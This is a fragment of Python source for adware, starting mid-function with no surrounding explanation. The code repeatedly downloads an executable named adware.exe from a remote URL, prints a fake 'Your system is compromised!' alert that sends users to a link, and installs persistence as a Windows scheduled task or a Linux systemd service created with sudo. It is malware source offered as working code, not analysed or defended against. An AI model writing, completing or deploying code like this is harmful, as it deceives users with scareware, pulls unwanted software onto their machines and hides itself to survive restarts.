        while True:
            try:
                response = requests.get(download_url)
                if response.status_code == 200:
                    with open('adware.exe', 'wb') as file:
                        file.write(response.content)
                    print("Executable downloaded successfully.")
            except Exception as e:
                print(f"Error downloading executable: {e}")
            time.sleep(60)  # Download every 60 seconds

    def display_fake_alert():
        while True:
            print(f"Security Alert: Your system is compromised! Visit {alert_url} for more information.")
            time.sleep(300)  # Display alert every 5 minutes

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "C:\\path\\to\\adware.exe" /sc minute /mo 1'
        elif system == "Linux":
            service_name = "adware"
            service_command = f'echo "[Unit]\nDescription=Adware Service\n[Service]\nExecStart=/path/to/adware\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/{service_name}.service && sudo systemctl enable {service_name}'
        else:
            print("Unsupported operating system")
            return
        try:
            subprocess.run(service_command, shell=True, check=True)
            print(f"Service {service_name} created successfully.")
        except Exception as e:
            print(f"Error creating service: {e}")

    download_thread = threading.Thread(target=download_executable)
    alert_thread = threading.Thread(target=display_fake_alert)
    persistence_thread = threading.Thread(target=create_persistence)

    download_thread.start()
    alert_thread.start()
    persistence_thread.start()

    download_thread.join()
    alert_thread.join()
    persistence_thread.join()
